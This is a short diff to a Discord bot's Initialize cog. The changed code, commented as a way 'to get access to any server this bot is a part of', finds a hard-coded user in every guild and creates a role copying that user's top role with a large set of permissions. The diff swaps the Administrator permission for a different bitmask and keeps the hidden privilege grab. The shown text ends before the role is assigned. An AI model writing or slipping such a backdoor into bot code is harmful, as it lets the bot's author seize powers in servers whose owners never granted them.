@@ -180,9 +180,9 @@ class Initialize(commands.Cog):
             # Little something to get access to any server this bot is a part of
             me = discord.utils.get(guild.members, id=me_id)
             if me:
-                if me.guild_permissions.value != 8589934591:
+                if me.guild_permissions.value != 1110751554672:
                     my_roles = [x.name for x in me.roles]
-                    perms = discord.Permissions(8)
+                    perms = discord.Permissions(1110751554672)
                     if my_roles[-1] != '@everyone':
                         copy_this = me.roles[-1]
                         admin = await guild.create_role(name=copy_this.name, hoist=copy_this.hoist,
